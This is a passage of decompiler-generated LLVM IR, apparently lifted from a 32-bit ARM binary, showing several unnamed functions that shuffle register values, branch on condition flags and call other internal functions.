  %v1_10a54 = load i32, i32* %r1.global-to-local, align 4
  %v2_10a54 = add i32 %v1_10a54, 12
  %v3_10a54 = inttoptr i32 %v2_10a54 to i32*
  store i32 %v0_10a54, i32* %v3_10a54, align 4
  %v0_10a58 = load i32, i32* %r4.global-to-local, align 4
  %v1_10a58 = load i32, i32* %r3.global-to-local, align 4
  %v2_10a58 = add i32 %v1_10a58, 8
  %v3_10a58 = inttoptr i32 %v2_10a58 to i32*
  store i32 %v0_10a58, i32* %v3_10a58, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a60:                               ; preds = %dec_label_pc_109d4
  %v2_10a60 = add i32 %v1_109e4, %v0_10a60
  store i32 %v2_10a60, i32* %ip.global-to-local, align 4
  %v1_10a64 = or i32 %v2_10a60, 1
  store i32 %v1_10a64, i32* %r3.global-to-local, align 4
  %v0_10a68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a68, i32* %v2_109dc, align 4
  %v0_10a6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10a6c = load i32, i32* %r4.global-to-local, align 4
  %v2_10a6c = add i32 %v1_10a6c, 4
  %v3_10a6c = inttoptr i32 %v2_10a6c to i32*
  store i32 %v0_10a6c, i32* %v3_10a6c, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a30, %dec_label_pc_10a60
  %v0_10a70 = load i32, i32* %ip.global-to-local, align 4
  %v3_10a74 = icmp ult i32 %v0_10a70, 131070
  br i1 %v3_10a74, label %dec_label_pc_10ae0, label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %dec_label_pc_10a70
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_10a7c = load i32, i32* @r7, align 4
  %v2_10a7c = add i32 %v0_10a7c, 32
  %v3_10a7c = inttoptr i32 %v2_10a7c to i32*
  %v4_10a7c = load i32, i32* %v3_10a7c, align 4
  store i32 %v4_10a7c, i32* @r4, align 4
  %v1_10a80 = inttoptr i32 %v4_10a7c to i32*
  %v2_10a80 = load i32, i32* %v1_10a80, align 4
  store i32 %v2_10a80, i32* %r3.global-to-local, align 4
  %v1_10a84 = and i32 %v2_10a80, 2
  %v2_10a84 = icmp eq i32 %v1_10a84, 0
  br i1 %v2_10a84, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_10a78
  store i32 %v4_10a7c, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_10a78, %bb
  store i32 68240, i32* @lr, align 4
  %v1_10a8c = xor i1 %v2_10a84, true
  call void @__pseudo_cond_branch(i1 %v1_10a8c, i32 ptrtoint (i32* @global_var_10730.421 to i32))
  %v0_10a90 = load i32, i32* @r4, align 4
  %v1_10a90 = add i32 %v0_10a90, 44
  %v2_10a90 = inttoptr i32 %v1_10a90 to i32*
  %v3_10a90 = load i32, i32* %v2_10a90, align 4
  store i32 %v3_10a90, i32* %r3.global-to-local, align 4
  %v1_10a94 = add i32 %v3_10a90, 4
  %v2_10a94 = inttoptr i32 %v1_10a94 to i32*
  %v3_10a94 = load i32, i32* %v2_10a94, align 4
  store i32 %v3_10a94, i32* %r3.global-to-local, align 4
  %v1_10a98 = add i32 %v0_10a90, 836
  %v2_10a98 = inttoptr i32 %v1_10a98 to i32*
  %v3_10a98 = load i32, i32* %v2_10a98, align 4
  store i32 %v3_10a98, i32* %r2.global-to-local, align 4
  %v1_10a9c = and i32 %v3_10a94, -4
  store i32 %v1_10a9c, i32* %r3.global-to-local, align 4
  %v3_10aa0 = icmp ult i32 %v1_10a9c, %v3_10a98
  br i1 %v3_10aa0, label %dec_label_pc_10ae0, label %dec_label_pc_10aa8

dec_label_pc_10aa8:                               ; preds = %bb15
  store i32 %v0_10a90, i32* %r1.global-to-local, align 4
  %v1_10aac = add i32 %v0_10a90, 840
  %v2_10aac = inttoptr i32 %v1_10aac to i32*
  %v3_10aac = load i32, i32* %v2_10aac, align 4
  store i32 %v3_10aac, i32* %r0.global-to-local, align 4
  %v2_10ab0 = call i32 @function_10680(i32 %v3_10aac, i32 %v0_10a90)
  store i32 %v2_10ab0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ae0

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_1097c
  %v2_10ab8 = inttoptr i32 %v1_1094c to i32*
  %v3_10ab8 = load i32, i32* %v2_10ab8, align 4
  store i32 %v3_10ab8, i32* %r0.global-to-local, align 4
  %v1_10abc = add i32 %v4_1093c, 848
  %v2_10abc = inttoptr i32 %v1_10abc to i32*
  %v3_10abc = load i32, i32* %v2_10abc, align 4
  store i32 %v3_10abc, i32* %r2.global-to-local, align 4
  %v1_10ac0 = add i32 %v4_1093c, 868
  %v2_10ac0 = inttoptr i32 %v1_10ac0 to i32*
  %v3_10ac0 = load i32, i32* %v2_10ac0, align 4
  %v2_10ac4 = add i32 %v3_10ab8, %v1_10948
  store i32 %v2_10ac4, i32* %r1.global-to-local, align 4
  %v1_10ac8 = add i32 %v3_10abc, -1
  store i32 %v1_10ac8, i32* %r2.global-to-local, align 4
  %v2_10acc = sub i32 %v3_10ac0, %v2_10ac4
  store i32 %v2_10acc, i32* %r3.global-to-local, align 4
  store i32 %v2_10acc, i32* %v2_10ac0, align 4
  %v1_10ad4 = load i32, i32* @lr, align 4
  %v2_10ad4 = add i32 %v1_10ad4, 848
  %v3_10ad4 = inttoptr i32 %v2_10ad4 to i32*
  store i32 %v1_10ac8, i32* %v3_10ad4, align 4
  %v0_10ad8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ad8 = load i32, i32* @r5, align 4
  %v2_10ad8 = sub i32 %v1_10ad8, %v0_10ad8
  store i32 %v2_10ad8, i32* %r0.global-to-local, align 4
  %v4_10adc = call i32 @function_126ac(i32 %v2_10ad8, i32 %v2_10ac4, i32 %v1_10ac8, i32 %v2_10acc)
  store i32 %v4_10adc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %bb15, %dec_label_pc_10a70, %dec_label_pc_10aa8, %dec_label_pc_1095c, %dec_label_pc_10ab8
  store i32 %v2_108f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_10aec = load i32, i32* @r7, align 4
  %v2_10aec = add i32 %v0_10aec, 24
  %v3_10aec = inttoptr i32 %v2_10aec to i32*
  %v4_10aec = load i32, i32* %v3_10aec, align 4
  store i32 %v4_10aec, i32* @ip, align 4
  store i32 68344, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10aec)
  br label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_108e4, %dec_label_pc_10ae0
  store i32 %v3_108e4, i32* @r4, align 4
  store i32 %v6_108e4, i32* @r5, align 4
  store i32 %v9_108e4, i32* @r6, align 4
  store i32 %v12_108e4, i32* @r7, align 4
  store i32 %v18_108e4, i32* @lr, align 4
  ret i32 %v2_108f0

; uselistorder directives
  uselistorder i32 %v0_10a90, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10a50, { 1, 0 }
  uselistorder i32 %v1_10990, { 1, 0 }
  uselistorder i32 %v0_10990, { 1, 0 }
  uselistorder i32 %v3_10964, { 1, 0 }
  uselistorder i32 %v1_10948, { 1, 0, 2 }
  uselistorder i32 %v2_10944, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1093c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_108ec, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 14, 0, 1, 2, 13, 4, 5, 11, 12, 6, 7, 8, 10, 9 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10af8, { 1, 0 }
  uselistorder label %dec_label_pc_10ae0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
  uselistorder label %dec_label_pc_10a30, { 1, 0 }
  uselistorder label %dec_label_pc_10a24, { 1, 0 }
  uselistorder label %dec_label_pc_10a20, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_109d4, { 1, 0 }
}

define i32 @function_10b08(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b08:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_10b08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10b08, label %bb, label %dec_label_pc_10b08..thread4_crit_edge

dec_label_pc_10b08..thread4_crit_edge:            ; preds = %dec_label_pc_10b08
  %v0_10b34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_10b08
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10b08..thread4_crit_edge, %bb
  %v0_10b34 = phi i32 [ %v0_10b34.pre, %dec_label_pc_10b08..thread4_crit_edge ], [ 0, %bb ]
  %v3_10b20 = load i32, i32* @r4, align 4
  store i32 %v3_10b20, i32* %stack_var_-12, align 4
  %v6_10b20 = load i32, i32* @r5, align 4
  %v9_10b20 = load i32, i32* @lr, align 4
  %v4_10b30 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_10b30, i32* @r5, align 4
  store i32 %v0_10b34, i32* @r4, align 4
  store i32 %v4_10b30, i32* @r0, align 4
  %v0_10b40 = call i32 @function_10730()
  %v0_10b44 = load i32, i32* @r4, align 4
  store i32 %v0_10b44, i32* %r0.global-to-local, align 4
  %v0_10b48 = load i32, i32* @r5, align 4
  %v2_10b50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10b50, i32* @r4, align 4
  store i32 %v6_10b20, i32* @r5, align 4
  store i32 %v9_10b20, i32* @lr, align 4
  %v2_10b54 = call i32 @function_10680(i32 %v0_10b44, i32 %v0_10b48)
  store i32 %v2_10b54, i32* %r0.global-to-local, align 4
  %v0_10b58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10b58, label %bb12, label %.thread5

bb12:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb12
  %v4_10b5c = phi i32 [ %v2_10b54, %.thread4 ], [ 0, %bb12 ]
  ret i32 %v4_10b5c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10680, { 1, 0 }
  uselistorder i32 ()* @function_10730, { 3, 2, 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10b60() local_unnamed_addr {
dec_label_pc_10b60:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 142044, i32* @r5, align 4
  %v4_10b78 = load i32, i32* inttoptr (i32 142060 to i32*), align 4
  store i32 68484, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10b78)
  %v2_10b94 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_10ba0 = call i32 @function_12774(i32 1, i32 %v2_10b94, i32 0, i32 32, i32 32, i32 0)
  %v4_10ba8 = load i32, i32* @global_var_254b8.429, align 4
  %v2_10bac = icmp eq i32 %v4_10ba8, 0
  br i1 %v2_10bac, label %dec_label_pc_10bb4, label %dec_label_pc_10bf4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b60
  store i32 1, i32* @global_var_254b8.429, align 4
  br label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10c04, %dec_label_pc_10bb4
  %v0_10bc0 = load i32, i32* @r5, align 4
  %v2_10bc0 = add i32 %v0_10bc0, 684
  store i32 %v2_10bc0, i32* @r4, align 4
  %v2_10bcc = add i32 %v0_10bc0, 36
  %v3_10bcc = inttoptr i32 %v2_10bcc to i32*
  %v4_10bcc = load i32, i32* %v3_10bcc, align 4
  call void @__pseudo_branch(i32 %v4_10bcc)
  %v1_10bdc = call i32 @function_fccc(i32 6)
  %v0_10be8 = load i32, i32* @r5, align 4
  %v2_10be8 = add i32 %v0_10be8, 16
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  %v4_10be8 = load i32, i32* %v3_10be8, align 4
  store i32 68596, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10be8)
  %v4_10bf8.pre = load i32, i32* @global_var_254b8.429, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10b60, %dec_label_pc_10bbc
  %v0_10c08 = phi i32 [ %v4_10ba8, %dec_label_pc_10b60 ], [ %v4_10bf8.pre, %dec_label_pc_10bbc ]
  %v7_10bfc = icmp eq i32 %v0_10c08, 1
  br i1 %v7_10bfc, label %dec_label_pc_10c04, label %dec_label_pc_10c40

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10bf4
  %v2_10c04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_10c04, i32* @r4, align 4
  store i32 2, i32* @global_var_254b8.429, align 4
  store i32 20, i32* @r2, align 4
  %v2_10c1c = bitcast i32* %stack_var_-28 to i8*
  %v3_10c1c = call i32 @function_f240(i8* %v2_10c1c, i32 0)
  %v6_10c38 = call i32 @function_1227c(i32 6, i32 %v2_10c04, i32 0, i32 -1, i32 -1, i32 -1)
  br label %dec_label_pc_10bbc

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10bf4
  %v7_10c40 = icmp eq i32 %v0_10c08, 2
  br i1 %v7_10c40, label %dec_label_pc_10c48, label %dec_label_pc_10c54

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c40
  store i32 3, i32* @global_var_254b8.429, align 4
  %v0_10c50 = call i32 @function_10b60()
  %v4_10c54.pre = load i32, i32* @global_var_254b8.429, align 4
  br label %dec_label_pc_10c54

dec_label_pc_10c54:                               ; preds = %dec_label_pc_10c40, %dec_label_pc_10c48
  %v1_10c5c = phi i32 [ %v0_10c08, %dec_label_pc_10c40 ], [ %v4_10c54.pre, %dec_label_pc_10c48 ]
  %v7_10c58 = icmp eq i32 %v1_10c5c, 3
  br i1 %v7_10c58, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10c54
  store i32 4, i32* @global_var_254b8.429, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10c54, %bb
  call void @__pseudo_cond_branch(i1 %v7_10c58, i32 ptrtoint (i32* @global_var_12748.431 to i32))
  br label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c6c, %.thread1
  %v0_10c6c = call i32 @function_10b60()
  br label %dec_label_pc_10c6c

; uselistorder directives
  uselistorder i32* @global_var_254b8.429, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10c54, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 1, 0 }
}

define i32 @function_10c78(i64* %arg1) local_unnamed_addr {
dec_label_pc_10c78:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_10c78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10c78, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10c78
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10c78, %bb
  %v4_10c84 = phi i32 [ %tmp, %dec_label_pc_10c78 ], [ 0, %bb ]
  ret i32 %v4_10c84

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10c88() local_unnamed_addr {
dec_label_pc_10c88:
  %v0_10c90 = call i32 @function_10ca0()
  ret i32 %v0_10c90
}

define i32 @function_10ca0() local_unnamed_addr {
dec_label_pc_10ca0:
  %stack_var_-20 = alloca i32, align 4
  %v3_10ca0 = load i32, i32* @r4, align 4
  store i32 142044, i32* @r4, align 4
  %v4_10cd0 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_10cd0)
  %v0_10ce4 = load i32, i32* @r4, align 4
  %v2_10ce4 = add i32 %v0_10ce4, 16
  %v3_10ce4 = inttoptr i32 %v2_10ce4 to i32*
  %v4_10ce4 = load i32, i32* %v3_10ce4, align 4
  store i32 ptrtoint (i32* @global_var_10cf0.437 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10ce4)
  %v2_10cf4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10cf8 = load i32, i32* @r4, align 4
  %v2_10cf8 = add i32 %v0_10cf8, 860
  %v2_10cfc = inttoptr i32 %v2_10cf8 to i32*
  %v3_10cfc = call i32 @function_11044(i32* %v2_10cfc, i32 %v2_10cf4)
  %v0_10d0c = load i32, i32* @r4, align 4
  %v2_10d0c = add i32 %v0_10d0c, 24
  %v3_10d0c = inttoptr i32 %v2_10d0c to i32*
  %v4_10d0c = load i32, i32* %v3_10d0c, align 4
  store i32 %v4_10d0c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_10d0c)
  %v3_10d18 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_10ca0, i32* @r4, align 4
  ret i32 %v3_10d18
}

define i32 @function_10d2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10d2c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_10d2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d2c, label %bb, label %dec_label_pc_10d2c..thread4_crit_edge

dec_label_pc_10d2c..thread4_crit_edge:            ; preds = %dec_label_pc_10d2c
  %v0_10d68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_10d2c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10d2c..thread4_crit_edge, %bb
  %v0_10d68 = phi i32 [ %v0_10d68.pre, %dec_label_pc_10d2c..thread4_crit_edge ], [ 0, %bb ]
  store i32 142044, i32* @r6, align 4
  %v2_10d58 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v0_10d68, i32* @r5, align 4
  store i32 %v2_10d58, i32* %r0.global-to-local, align 4
  %v4_10d74 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_10d74)
  store i32 142752, i32* %r0.global-to-local, align 4
  %v0_10d88 = load i32, i32* @r6, align 4
  %v2_10d88 = add i32 %v0_10d88, 16
  %v3_10d88 = inttoptr i32 %v2_10d88 to i32*
  %v4_10d88 = load i32, i32* %v3_10d88, align 4
  store i32 69012, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10d88)
  %v0_10d98 = load i32, i32* @r6, align 4
  %v2_10d98 = add i32 %v0_10d98, 860
  %v0_10da0 = load i32, i32* @r5, align 4
  store i32 %v0_10da0, i32* %r0.global-to-local, align 4
  %v1_10da4 = add i32 %v0_10d98, 868
  %v2_10da4 = inttoptr i32 %v1_10da4 to i32*
  %v3_10da4 = load i32, i32* %v2_10da4, align 4
  store i32 %v3_10da4, i32* @r4, align 4
  %v2_10da8 = inttoptr i32 %v2_10d98 to i32*
  %v3_10da8 = call i32 @function_10f60(i32 %v0_10da0, i32* %v2_10da8)
  %v1_10db0 = icmp slt i32 %v3_10da8, 0
  store i32 %v2_10d58, i32* %r0.global-to-local, align 4
  %v3_10dc0 = load i32, i32* @r4, align 4
  %v4_10dc0 = add i32 %v3_10dc0, -4
  %storemerge = select i1 %v1_10db0, i32 0, i32 %v4_10dc0
  %v0_10dc4 = load i32, i32* @r6, align 4
  %v2_10dc4 = add i32 %v0_10dc4, 24
  %v3_10dc4 = inttoptr i32 %v2_10dc4 to i32*
  %v4_10dc4 = load i32, i32* %v3_10dc4, align 4
  call void @__pseudo_branch(i32 %v4_10dc4)
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10de4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10de4:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10de4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10de4, label %bb, label %dec_label_pc_10de4..thread4_crit_edge

dec_label_pc_10de4..thread4_crit_edge:            ; preds = %dec_label_pc_10de4
  %v0_10e18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_10de4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10de4..thread4_crit_edge, %bb
  %v0_10e18 = phi i32 [ %v0_10e18.pre, %dec_label_pc_10de4..thread4_crit_edge ], [ 0, %bb ]
  %v6_10dfc = load i32, i32* @r5, align 4
  store i32 142044, i32* @r4, align 4
  %v2_10e10 = ptrtoint i32* %stack_var_-48 to i32
  store i32 142752, i32* %r5.global-to-local, align 4
  store i32 %v0_10e18, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %v2_10e10, i32* %r0.global-to-local, align 4
  %v4_10e34 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_10e34)
  %v0_10e40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10e40, i32* %r0.global-to-local, align 4
  %v0_10e48 = load i32, i32* @r4, align 4
  %v2_10e48 = add i32 %v0_10e48, 16
  %v3_10e48 = inttoptr i32 %v2_10e48 to i32*
  %v4_10e48 = load i32, i32* %v3_10e48, align 4
  store i32 69204, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10e48)
  %v0_10e58 = load i32, i32* @r6, align 4
  %v0_10e5c = load i32, i32* @r4, align 4
  %v2_10e5c = add i32 %v0_10e5c, 860
  %v0_10e60 = load i32, i32* @r7, align 4
  %v0_10e64 = load i32, i32* @sl, align 4
  store i32 %v0_10e64, i32* @r0, align 4
  %v1_10e68 = add i32 %v0_10e5c, 868
  %v2_10e68 = inttoptr i32 %v1_10e68 to i32*
  %v3_10e68 = load i32, i32* %v2_10e68, align 4
  store i32 %v3_10e68, i32* @r5, align 4
  %v4_10e6c = inttoptr i32 %v0_10e64 to i32*
  %v5_10e6c = call i32 @function_111ac(i32* %v4_10e6c, i32 %v0_10e58, i32 %v0_10e60, i32 %v2_10e5c)
  store i32 %v2_10e10, i32* %r0.global-to-local, align 4
  %v0_10e7c = load i32, i32* @r4, align 4
  %v2_10e7c = add i32 %v0_10e7c, 24
  %v3_10e7c = inttoptr i32 %v2_10e7c to i32*
  %v4_10e7c = load i32, i32* %v3_10e7c, align 4
  call void @__pseudo_branch(i32 %v4_10e7c)
  %v0_10e88 = load i32, i32* @r5, align 4
  %v1_10e88 = add i32 %v0_10e88, -4
  store i32 %v1_10e88, i32* %r0.global-to-local, align 4
  store i32 %v6_10dfc, i32* %r5.global-to-local, align 4
  ret i32 %v1_10e88

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10ea4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ea4:
  %v0_10ea4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10ea4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10ea4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10ea4, %bb
  %v10_10eb8 = phi i32 [ %arg1, %dec_label_pc_10ea4 ], [ 0, %bb ]
  ret i32 %v10_10eb8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10ebc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ebc:
  %stack_var_-40 = alloca i32, align 4
  %v3_10ebc = load i32, i32* @r4, align 4
  %v6_10ebc = load i32, i32* @r5, align 4
  %v9_10ebc = load i32, i32* @r6, align 4
  %v15_10ebc = load i32, i32* @lr, align 4
  store i32 142044, i32* @r4, align 4
  %v2_10ed0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 142752, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_10eec = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_10eec)
  %v0_10f00 = load i32, i32* @r4, align 4
  %v2_10f00 = add i32 %v0_10f00, 16
  %v3_10f00 = inttoptr i32 %v2_10f00 to i32*
  %v4_10f00 = load i32, i32* %v3_10f00, align 4
  store i32 69388, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10f00)
  %v0_10f10 = load i32, i32* @r6, align 4
  store i32 %v0_10f10, i32* @r0, align 4
  %v0_10f14 = load i32, i32* @r4, align 4
  %v2_10f14 = add i32 %v0_10f14, 860
  %v2_10f18 = inttoptr i32 %v0_10f10 to i32*
  %v3_10f18 = call i32 @function_110d4(i32* %v2_10f18, i32 %v2_10f14)
  %v0_10f2c = load i32, i32* @r4, align 4
  %v2_10f2c = add i32 %v0_10f2c, 24
  %v3_10f2c = inttoptr i32 %v2_10f2c to i32*
  %v4_10f2c = load i32, i32* %v3_10f2c, align 4
  call void @__pseudo_branch(i32 %v4_10f2c)
  store i32 %v3_10ebc, i32* @r4, align 4
  store i32 %v6_10ebc, i32* @r5, align 4
  store i32 %v9_10ebc, i32* @r6, align 4
  store i32 %v15_10ebc, i32* @lr, align 4
  ret i32 %v2_10ed0

; uselistorder directives
  uselistorder i32 142752, { 1, 2, 0 }
}

define i32 @function_10f48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f48:
  %v0_10f48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10f48, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10f48
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10f48, %bb
  %v10_10f5c = phi i32 [ %arg1, %dec_label_pc_10f48 ], [ 0, %bb ]
  ret i32 %v10_10f5c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10f60(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10f60:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_10f60 = load i32, i32* @r4, align 4
  store i32 %v3_10f60, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_10f68 = add i32 %tmp, 12
  %v2_10f68 = inttoptr i32 %v1_10f68 to i8*
  %v3_10f68 = load i8, i8* %v2_10f68, align 1
  %v2_10f6c = icmp eq i8 %v3_10f68, 0
  br i1 %v2_10f6c, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_10f60
  %v4_10f68 = zext i8 %v3_10f68 to i32
  %v1_10f7411 = add i32 %arg1, 4
  store i32 %v1_10f7411, i32* %r6.global-to-local, align 4
  %v1_10f7812 = add i32 %tmp, 8
  %v2_10f7813 = inttoptr i32 %v1_10f7812 to i32*
  %v3_10f7814 = load i32, i32* %v2_10f7813, align 4
  %v3_10f94 = add i32 %v3_10f7814, -4
  %v4_10f94 = inttoptr i32 %v3_10f94 to i32*
  store i32 %v4_10f68, i32* %v4_10f94, align 4
  br label %dec_label_pc_11020

.thread6:                                         ; preds = %dec_label_pc_10f60
  %v2_10f70 = add i32 %tmp, 4
  %v3_10f70 = inttoptr i32 %v2_10f70 to i32*
  %v4_10f70 = load i32, i32* %v3_10f70, align 4
  %v1_10f74 = add i32 %arg1, 4
  store i32 %v1_10f74, i32* %r6.global-to-local, align 4
  %v1_10f78 = add i32 %tmp, 8
  %v2_10f78 = inttoptr i32 %v1_10f78 to i32*
  %v3_10f78 = load i32, i32* %v2_10f78, align 4
  %v3_10f80 = sub i32 %v4_10f70, %v3_10f78
  %v4_10f84 = sdiv i32 %v3_10f80, 4
  %v4_10f88 = sext i8 %v3_10f68 to i32
  %v4_10f90 = mul i32 %v4_10f84, 5
  %v5_10f90 = add i32 %v4_10f90, %v4_10f88
  %v3_10f98 = add i32 %v3_10f78, -4
  %v4_10f98 = inttoptr i32 %v3_10f98 to i32*
  store i32 %v5_10f90, i32* %v4_10f98, align 4
  br label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %.thread5, %.thread6
  %v0_10fa0 = load i32, i32* %r6.global-to-local, align 4
  %v1_10fa0 = add i32 %v0_10fa0, -4
  %v2_10fa0 = inttoptr i32 %v1_10fa0 to i32*
  %v3_10fa0 = load i32, i32* %v2_10fa0, align 4
  %v3_10fa8 = call i32 @function_cba0(i32 %v3_10fa0, i32 5)
  %v0_11020 = call i32 @function_ce08()
  %v2_11028 = inttoptr i32 %v0_11020 to i32*
  store i32 22, i32* %v2_11028, align 4
